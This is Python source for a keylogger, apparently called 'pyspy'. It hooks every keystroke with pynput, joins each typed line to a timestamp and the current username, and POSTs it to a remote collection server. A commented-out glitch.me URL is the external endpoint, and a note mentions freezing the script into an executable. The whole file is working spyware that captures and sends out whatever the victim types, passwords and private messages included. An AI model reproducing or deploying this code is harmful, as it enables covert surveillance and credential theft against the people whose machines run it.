from multiprocessing import Queue  # so cx_freeze wont cry
from pynput.mouse import Button, Controller
from pynput.keyboard import Key, Controller,Listener
import getpass
from time import ctime
import datetime
import requests
import sys

keyboard = Controller()
mouse = Controller()

message = ""
user = getpass.getuser()

URL = 'http://localhost:3000/newmessage'
initReq = 'http://localhost:3000/inituser'
getusersReq = 'http://localhost:3000/users'
# URL = 'https://grishadev-pyspy.glitch.me/newmessage'

def init():
    try:
        r = requests.post(initReq,data={"user":user})
        print(r.status_code, r.reason)
    except:
        print("Error sending request")
        destroy()

def on_press(key):
    global message
    
    print(str(key))

    if not str(key).startswith('Key.'):
        message += key.char
    else:
        if str(key) == "Key.space":
            message += " "

def on_release(key):
    global message

    if key == Key.enter:
        time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log = time+" || "+str(user)+" said: "+str(message)
        print(log)
        if len(message) > 0:
            sendMessage(log)
        message = ""
    # elif key == Key.esc:
        # Stop listener
        # return False


def sendMessage(log):
    try:
        r = requests.post(URL,data={"msg":log})
        print(r.status_code, r.reason)
        print("stfu")
    except:
        print("Error sending request")
    getUsers()

def getUsers():
    r = None

    try:
        r = requests.get(getusersReq)
        print(r.status_code, r.reason)
    except:
        print("Error sending request")

    if r is not None:
        usersjson = r.json()
        users = usersjson['users']
        if user not in users:
            destroy()

def destroy():
    sys.exit()

init()

# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()